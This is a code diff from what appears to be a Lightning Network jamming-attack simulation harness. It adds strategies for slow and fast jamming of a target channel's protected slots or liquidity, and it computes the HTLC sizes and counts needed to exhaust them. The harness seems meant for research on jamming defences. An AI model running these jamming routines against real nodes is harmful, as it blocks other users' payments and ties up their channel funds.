@@ -14,9 +14,33 @@ import (
 	"github.com/lightningnetwork/lnd/routing/route"
 )
 
+type attackStrategy uint8
+
+const (
+	attackStrategySlowJamSlots attackStrategy = iota
+	attackStrategySlowJamLiqudity
+	attackStrategyFastJamSlots
+	attackStrategyFastJamLiquidty
+)
+
+// isSlowJam returns a boolean if the attack strategy slowjams protected
+// resources.
+func (a attackStrategy) isSlowJam() bool {
+	return a == attackStrategySlowJamSlots ||
+		a == attackStrategySlowJamLiqudity
+}
+
+// isLiquidityJam returns a boolean if the attack strategy targets liquidity
+// (over slots).
+// liquidity).
+func (a attackStrategy) isLiquidityJam() bool {
+	return a == attackStrategySlowJamLiqudity ||
+		a == attackStrategyFastJamLiquidty
+}
+
 func runAttack(ctx context.Context, graph *GraphHarness,
 	jammer *JammingHarness, targetNode route.Vertex,
-	targetPeerAlias string, slowJam bool) error {
+	targetPeerAlias string, stragegy attackStrategy) error {
 
 	info, err := graph.GetTargetsInfo(ctx, targetPeerAlias, targetNode)
 	if err != nil {
@@ -84,36 +108,29 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 		log.Printf("General jams: %v", results)
 	}()
 
-	// Get the route we'll use for our protected jamming, using the last
-	// channel that was *not* used to jam general.
-	jamAmt := lnwire.MilliSatoshi(400_000)
-	zeroToTwo, err := jammer.LndNodes.GetNode(0).Client.QueryRoutes(
-		ctx,
-		lndclient.QueryRoutesRequest{
-			PubKey:       jammer.LndNodes.GetNode(2).NodePubkey,
-			AmtMsat:      jamAmt,
-			FeeLimitMsat: lnwire.MaxMilliSatoshi,
-		},
-	)
+	// Set the target final channel ID for our route. Hard set to use the
+	// final channel that is not currently holding our general slow jams.
+	route, count, err := getRouteForStrategy(ctx, jammer, stragegy, info)
 	if err != nil {
-		return fmt.Errorf("0 -> 2: %w", err)
+		return fmt.Errorf("get route for stragegy: %v: %v", stragegy,
+			err)
 	}
-	zeroToTwo.Hops[len(zeroToTwo.Hops)-1].ChannelID = finalSCIDs[1].ToUint64()
+
+	route.Hops[len(route.Hops)-1].ChannelID = finalSCIDs[1].ToUint64()
 
 	log.Print("Paying for reputation to access protected slots")
-	err = buildReputationForProtected(ctx, jammer, zeroToTwo, targetNode, 483/2)
+	err = buildReputationForProtected(ctx, jammer, route, targetNode, count)
 	if err != nil {
 		return fmt.Errorf("Build protected reputation: %w", err)
 	}
 
-	if slowJam {
-		// Run slow jam on protected slots, note
+	if stragegy.isSlowJam() {
 		err = slowJamProtected(
-			ctx, jammer, zeroToTwo, time.Minute*10, finalSCIDs[1],
+			ctx, jammer, route, time.Minute*10, finalSCIDs[1],
 		)
 	} else {
 		err = fastJamProtectedSlots(
-			ctx, jammer, zeroToTwo, time.Minute*10,
+			ctx, jammer, route, time.Minute*10,
 		)
 	}
 	if err != nil {
@@ -125,6 +142,71 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	wg.Wait()
 
 	return nil
+}
+
+func getRouteForStrategy(ctx context.Context, j *JammingHarness,
+	strategy attackStrategy, info *TargetsInfo) (
+	*lndclient.QueryRoutesResponse, int, error) {
+
+	// Next, we get our route and htlc count based on whether we're
+	// going for liquidity or slot jamming.
+	if strategy.isLiquidityJam() {
+		// For liquidity jamming, we're trading off between two
+		// priorities:
+		// - Small HTLCs make it easier to capture all liquidity
+		// - More small HTLCs cost more (leaning towards slot jamming)
+		//
+		// We go for 5% of the capacity (or the max htlc) as a good
+		// inbetween.
+		capacityMsat := lnwire.NewMSatFromSatoshis(info.TargetChannel.Capacity)
+		htlcSize := capacityMsat / 20
+		maxHtlc := lnwire.MilliSatoshi(info.TargetToPeerPolicy().MaxHtlcMsat)
+		if htlcSize > maxHtlc {
+			log.Printf("Replacing htlc: %v with channel max: %v",
+				htlcSize, maxHtlc)
+
+			htlcSize = maxHtlc
+		}
+
+		count := int(capacityMsat) / int(htlcSize)
+
+		log.Printf("Sending %v htlcs x %v for capacity: %v",
+			htlcSize, count, lnwire.NewMSatFromSatoshis(
+				info.TargetChannel.Capacity,
+			),
+		)
+
+		route, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
+			ctx,
+			lndclient.QueryRoutesRequest{
+				PubKey:       j.LndNodes.GetNode(2).NodePubkey,
+				AmtMsat:      htlcSize,
+				FeeLimitMsat: lnwire.MaxMilliSatoshi,
+			},
+		)
+		if err != nil {
+			return nil, 0, fmt.Errorf("liquidity: 0 -> 2: %w", err)
+		}
+
+		return route, count, nil
+	}
+
+	// For slot jamming, we simply choose a small above dust amount, and
+	// set our count to the number of protected slows available.
+	jamAmt := lnwire.MilliSatoshi(400_000)
+	route, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
+		ctx,
+		lndclient.QueryRoutesRequest{
+			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
+			AmtMsat:      jamAmt,
+			FeeLimitMsat: lnwire.MaxMilliSatoshi,
+		},
+	)
+	if err != nil {
+		return nil, 0, fmt.Errorf("liquidity: 0 -> 2: %w", err)
+	}
+
+	return route, 483 / 2, nil
 }
 
 // Dispatches a fast jamming attack against the protected slots, blocking until
